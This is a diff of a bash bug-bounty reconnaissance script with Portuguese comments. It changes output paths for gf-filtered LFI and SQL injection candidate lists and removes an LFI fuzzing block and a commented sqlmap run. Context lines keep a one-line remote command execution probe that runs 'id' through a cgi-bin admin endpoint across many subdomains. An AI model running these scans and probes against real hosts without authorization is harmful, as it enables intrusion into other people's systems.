@@ -241,10 +241,10 @@ echo -e "\e[1;31m$(wc -l < "$folder/EndpointsL.txt")\e[0m"
 
 # Executando Gf Patterns
 echo -e "\e[32mExecutando Gf lfi...\e[0m"
-cat "$folder/EndpointsL.txt" | uro | gf lfi | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q Lfi.txt
+cat "$folder/EndpointsL.txt" | uro | gf lfi | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q "$folder/Lfi.txt"
 
 echo -e "\e[32mExecutando Gf sqli...\e[0m"
-cat "$folder/EndpointsL.txt" | uro | gf sqli | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q sqli.txt
+cat "$folder/EndpointsL.txt" | uro | gf sqli | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q "$folder/sqli.txt"
 
 echo -e "\e[32mExecutando Gf xss...\e[0m"
 cat "$folder/EndpointsL.txt" | uro | gf xss | anew -q "$folder/xss.txt"
@@ -299,21 +299,6 @@ cat "$folder/live_subdomains.txt" | while read h do; do curl -sk "$h/module/?mod
 # One-line Rce
 echo -e "\e[32mRCE One-line\e[0m"
 cat "$folder/subdomains.txt" | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80,443,8080,8443 -mr "uid=" -silent | grep -q "uid=" && echo "$h: VULNERABLE" > "$folder/RceOneline.txt"
-
-#lfi
-# Passar caminho da Wordlist de paylouds!!!
-# https://raw.githubusercontent.com/mrxbug/lfi-paylouds-small/main/lfi.txt
-echo -e "\e[32mExecutando lfi Vulnerabilit\e[0m"
-cat ~/wordlists/payloads/lfi.txt | xargs -P 50 -I % bash -c "cat Lfi.txt | qsreplace % " 2> /dev/null | anew -q templfi.txt
-xargs -a templfi.txt -P 50 -I % bash -c "curl -s -L  -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"root:\" && echo -e \"[POTENCIAL LFI] - % \n \"" 2> /dev/null | grep "POTENCIAL LFI" | anew -q "$folder/vulnerabilitieslfi.txt"
-mv Lfi.txt "$folder/lfi.txt"
-rm templfi.txt
-
-#Sqli vulnerabilities
-# Passar caminho do sqlmap
-#echo -e "\e[32mExecutando sqli Vulnerabilit\e[0m"
-#cat sqli.txt | xargs -P 30 -I % bash -c "python3 ~/tools/sqlmap/sqlmap.py -u % -b --batch --disable-coloring --random-agent --risk 3 --level 5 --output-dir="$folder/sqlmapVUL.txt" 2> /dev/null" &> /dev/null
-mv sqli.txt "$folder/sqli.txt"
 
 # takeover vulnerabilities
 # criar caminho e add o arquivo abaixo
